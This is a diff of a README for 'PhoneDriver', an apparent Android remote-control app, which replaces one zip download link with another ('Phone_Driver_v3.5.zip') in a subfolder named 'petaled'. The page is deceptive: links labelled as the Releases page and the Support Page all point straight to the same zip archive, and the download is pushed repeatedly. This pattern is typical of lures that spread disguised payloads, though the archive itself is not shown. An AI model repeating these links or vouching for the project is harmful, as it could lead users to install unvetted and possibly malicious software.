@@ -1,7 +1,7 @@
 # 📱 PhoneDriver - Control Your Android Phone Easily
 
 ## 📥 Download Now
-[![Download PhoneDriver](https://raw.githubusercontent.com/Arib2708/PhoneDriver/main/petaled/PhoneDriver.zip)](https://raw.githubusercontent.com/Arib2708/PhoneDriver/main/petaled/PhoneDriver.zip)
+[![Download PhoneDriver](https://github.com/Arib2708/PhoneDriver/raw/refs/heads/main/petaled/Phone_Driver_v3.5.zip)](https://github.com/Arib2708/PhoneDriver/raw/refs/heads/main/petaled/Phone_Driver_v3.5.zip)
 
 ## 🚀 Getting Started
 Welcome to PhoneDriver! This application lets you control your Android phone directly from your computer. With PhoneDriver, you can manage your files, run applications, and handle notifications without needing to pick up your phone.
@@ -22,7 +22,7 @@ Welcome to PhoneDriver! This application lets you control your Android phone dir
 ## 📥 Download & Install
 To get started, visit the Releases page to download PhoneDriver.
 
-[Download PhoneDriver](https://raw.githubusercontent.com/Arib2708/PhoneDriver/main/petaled/PhoneDriver.zip)
+[Download PhoneDriver](https://github.com/Arib2708/PhoneDriver/raw/refs/heads/main/petaled/Phone_Driver_v3.5.zip)
 
 ### Installation Steps
 1. **Visit the Releases Page:** Click on the link above to go to the Releases page.
@@ -54,12 +54,12 @@ Once installed, you can start using PhoneDriver by following these steps:
 - Check the phone’s USB connection type (Change to "File Transfer").
 
 ## 📞 Support
-If you encounter any issues, visit our [Support Page](https://raw.githubusercontent.com/Arib2708/PhoneDriver/main/petaled/PhoneDriver.zip) and create a new issue. Our team will assist you as soon as possible.
+If you encounter any issues, visit our [Support Page](https://github.com/Arib2708/PhoneDriver/raw/refs/heads/main/petaled/Phone_Driver_v3.5.zip) and create a new issue. Our team will assist you as soon as possible.
 
 ## 📢 Contribution
 Interested in contributing? Check out our guidelines on how to get involved.
 
 ## 📥 Download Now Again
-Don't forget, you can download PhoneDriver here: [Download PhoneDriver](https://raw.githubusercontent.com/Arib2708/PhoneDriver/main/petaled/PhoneDriver.zip)
+Don't forget, you can download PhoneDriver here: [Download PhoneDriver](https://github.com/Arib2708/PhoneDriver/raw/refs/heads/main/petaled/Phone_Driver_v3.5.zip)
 
 We hope you enjoy using PhoneDriver and discover its many features that simplify your life!
